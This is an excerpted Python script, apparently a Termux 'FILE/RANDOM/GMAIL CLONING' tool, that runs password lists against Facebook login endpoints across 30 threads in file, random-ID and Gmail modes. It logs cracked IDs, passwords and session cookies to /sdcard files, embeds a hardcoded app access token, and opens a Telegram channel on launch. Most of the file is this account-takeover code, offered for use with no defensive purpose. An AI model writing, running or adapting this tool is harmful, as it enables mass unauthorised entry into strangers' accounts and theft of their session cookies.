...
#──────────────{ LOGO }──────────────#
print ("jone my teligerm channel 😁☢️")
os.system("xdg-open https://t.me/KGF_TERMUX_TEAM ")
logo = f"""{A}____ ____ ____ ____ ____ _  _ _    
|__| [__  |__/ |__| |___ |  | |    
|  | ___] |  \ |  | |    |__| |___                               
{A}─────────────────────────────────────────────────\n{A}|=| OWNER   : ASRAFUL AHMED\n{A}|=| TOOL    : FILE/RANDOM/GMAIL CLONING\n{A}|=| VERSION : 0.0\n
TELIGERM : https://t.me/KGF_TERMUX_TEAM{A}─────────────────────────────────────────────────"""
#──────────────{ MENU }──────────────#
def menu():
    clear()
...
def __Filex__():
    clear()
    print(f"{A}|=| EXAMPLE : /sdcard/ASRAFUL.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
    try:
    ...
    with ThreadPool(max_workers=30) as ASRAFULx:
        ...
        for user in dx:
            ...
            passlist = dplist
            if methodx in ['1']:ASRAFULx.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:ASRAFULx.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:ASRAFULx.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:ASRAFULx.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:ASRAFULx.submit(__file_M5__,ids,names,passlist)
            if methodx in ['6']:ASRAFULx.submit(__file_M6__,ids,names,passlist)
            if methodx in ['7']:ASRAFULx.submit(__file_M7__,ids,names,passlist)
            if methodx in ['8']:ASRAFULx.submit(__file_M8__,ids,names,passlist)
...
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
...
def __file_M2__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M4__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M5__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M6__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M6-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M7__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M7| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if "session_key" in po:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASRAFUL-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|ASRAFUL-CP| '+ids+f' | '+pas)
                open('/sdcard/ASRAFUL-M7-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
...
def __file_M8__(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\r{A}|ASRAFUL-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			ASRAFULxd=session.cookies.get_dict().keys()
			if "c_user" in ASRAFULxd:
				...
				print(f'\r\r{R}|ASRAFUL-CP| '+ids+' | '+pas)
				open('/sdcard/ASRAFUL-M8-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def __bdx__():
    ...
    with ThreadPool(max_workers=30) as ASRAFULx:
        ...
        for love in user:
            ...
            if methodx in ['1']:ASRAFULx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:ASRAFULx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:ASRAFULx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:ASRAFULx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:ASRAFULx.submit(__Randm_M5__,ids,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
...
def __Gmailx__():
    clear()
    user=[]
    print(f"{A}|=| EXAMPLE : ASRAFUL/Shakib/Rakib/Sumon ");linex();first = input(f'{A}|?| FIRST NAME  : ')
    clear()
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as ASRAFULxxxx:
        total=str(len(user))
        clear()
...
def __Randm_M1__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| {str(uid)} | {pas} ')
                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                                open('/sdcard/ASRAFUL-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}|ASRAFUL-CP| {str(uid)} | {pas} ')
                                open('/sdcard/ASRAFUL-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
...
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
...
def __Randm_M3__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASRAFUL-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
...
def __Randm_M4__(ids,passlist):
    ...
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|ASRAFUL-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| {ids} | {pas} ')
                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
                open('/sdcard/ASRAFUL-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
                ...
                ids = "1000"+coki1[0:11]
                print(f'\r\r{R}|ASRAFUL-OK| {ids} | {pas} ')
                open('/sdcard/ASRAFUL-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
...
def __Randm_M5__(ids,passlist):
    ...
    try:
        for pas in passlist:
            session=requests.Session()
            sys.stdout.write(f'\r\r{A}|ASRAFUL-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
...
def __GMAILX__(username,pswrd,total):
    global oks,cps,loop
    sys.stdout.write(f'\r\r{A}|ASRAFUL-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
    try:
        for password in pswrd:
            ...
            if 'session_key' in req:
                print(f'\r\r\x1b[38;5;46m|ASRAFUL-OK| '+username+' | '+password)
                open('/sdcard/ASRAFUL-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                oks.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r{R}|ASRAFUL-CP| '+username+' | '+password)
                open('/sdcard/ASRAFUL-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                cps.append(username)
                break
            else:
                continue
